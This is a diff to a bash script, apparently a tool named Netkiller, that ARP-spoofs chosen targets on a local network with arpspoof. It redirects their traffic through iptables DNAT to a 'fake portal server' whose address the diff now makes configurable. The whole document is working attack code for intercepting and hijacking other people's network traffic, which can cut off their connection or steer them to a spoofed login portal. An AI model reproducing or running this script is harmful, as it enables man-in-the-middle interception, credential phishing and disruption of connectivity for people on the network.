@@ -41,7 +41,7 @@ pkill -f arpspoof
 pkill arpspoof
 ip -s -s neigh flush all >/dev/null 2>&1
 iptables -t nat -F PREROUTING
-iptables -X REDIRECT 
+iptables -t nat -X REDIRECT 
 sleep 2
 echo -e "\nConnection is restored..."
 EOF
@@ -92,12 +92,18 @@ read -rp "> $IP " DEVIP
 MYIP="${DEVIP:-$IP}"
 echo " "
 
+# Fake portal server 
+echo "Enter Fake Portal Server: e.g 10.0.0.1:80"
+read -rp "> " PORTAL
+echo " "
+
 # Prompt configuration
 echo "[*]=[Target Network Configuration]=[*]"
 echo "[*] INTERFACE: | $INTERFACE"
 echo "[*] GATEWAY:   | $GATEWAY"
 echo "[*] DEVICE:    | $MYIP"
 echo "[*] TARGETS:   | $SUB"
+echo "[*] PORTAL:    | $PORTAL"
 echo " "
 
 # Prompt the user for confirmation
@@ -238,7 +244,7 @@ for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
      PIDS+=($!)
-     iptables -t nat -A REDIRECT -s "$TARGET" -j DNAT --to-destination 10.0.0.1:80
+     iptables -t nat -A REDIRECT -s "$TARGET" -j DNAT --to-destination "$PORTAL"
 done
 echo " "
 echo "To stop Netkiller, run: netkiller-stop"
